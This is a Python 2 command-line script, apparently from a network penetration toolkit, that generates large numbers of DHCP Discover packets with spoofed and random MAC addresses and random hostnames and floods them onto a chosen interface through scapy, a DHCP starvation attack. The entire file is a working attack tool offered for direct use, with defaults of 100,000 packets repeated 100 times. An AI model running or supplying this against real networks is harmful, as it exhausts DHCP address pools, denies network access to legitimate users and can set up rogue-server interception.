from raw_packet.Utils.base import Base
from argparse import ArgumentParser
from netifaces import ifaddresses, AF_LINK
from raw_packet.Utils.network import Ethernet_raw, DHCP_raw
from sys import stdout
from datetime import datetime
from time import time
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from scapy.all import sendp


if __name__ == "__main__":

    Base.check_user()

    PACKETS = []

    parser = ArgumentParser(description='DHCP Discover raw packet sender')
    parser.add_argument('-i', '--interface', help='Set interface name for send discover packets')
    parser.add_argument('-n', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
    parser.add_argument('-p', '--packets', help='Number of packets (default: 100000)', default=100000)
    parser.add_argument('-k', '--iterations', help='Number of iterations (default: 100)', default=100)
    args = parser.parse_args()

    number_of_packets = int(args.packets)
    number_of_iterations = int(args.iterations)

    current_network_interface = ""
    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface

    current_mac_address = ""
    try:
        current_mac_address = str(ifaddresses(current_network_interface)[AF_LINK][0]['addr'])
    except:
        print "This network interface does not have mac address!"
        exit(1)

    count = 0
    count_max = int(args.packets)

    index_percent = 0
    count_percent = 0

    print "Creating packets..."

    if args.notspoofmac:
        print " Your MAC address is not spoofed!"

    eth = Ethernet_raw()
    dhcp = DHCP_raw()

    while count < count_max:

        if args.notspoofmac:
            SRC_MAC = current_mac_address
        else:
            SRC_MAC = eth.get_mac_for_dhcp_discover()

        CLIENT_MAC = eth.get_random_mac()
        HOST_NAME = Base.make_random_string(8)

        current_packet = dhcp.make_discover_packet(SRC_MAC, CLIENT_MAC, HOST_NAME)
        PACKETS.append(current_packet)

        count += 1
        if count > count_percent:
            stdout.flush()
            stdout.write(" Complete: " + str(index_percent + 1) + "%   \r")
            index_percent += 1
            count_percent = (count_max / 100) * index_percent

    NUMBER_OF_PACKETS = int(args.packets)
    NUMBER_OF_ITERATIONS = int(args.iterations)

    print "\r\nSending packets..."
    print "Number of packets:       " + str(args.packets)
    print "Start sending packets:   " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    start_time = time()

    for _ in range(NUMBER_OF_ITERATIONS):
        for index in range(NUMBER_OF_PACKETS):
            sendp(PACKETS[index], iface=current_network_interface, verbose=False)

    stop_time = time()
    print "All packets sent:        " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    delta_time = stop_time - start_time
    speed = (NUMBER_OF_PACKETS * NUMBER_OF_ITERATIONS) / delta_time
    print "Speed:                   " + str(int(speed)) + " pkt/sec\r\n"
